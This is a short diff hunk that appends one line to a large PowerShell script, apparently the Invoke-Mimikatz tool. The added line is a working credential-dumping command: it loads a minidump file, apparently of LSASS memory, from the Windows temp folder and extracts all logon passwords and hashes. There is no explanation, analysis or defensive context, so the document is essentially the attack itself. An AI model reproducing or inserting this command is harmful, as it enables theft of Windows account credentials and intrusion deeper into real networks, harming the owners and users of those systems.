@@ -2741,3 +2741,5 @@ Function Main
 
 Main
 }
+
+Invoke-Mimikatz -Command ' "sekurlsa::minidump c:\windows\temp\backup.bin" "sekurlsa::logonpasswords full" "exit" '
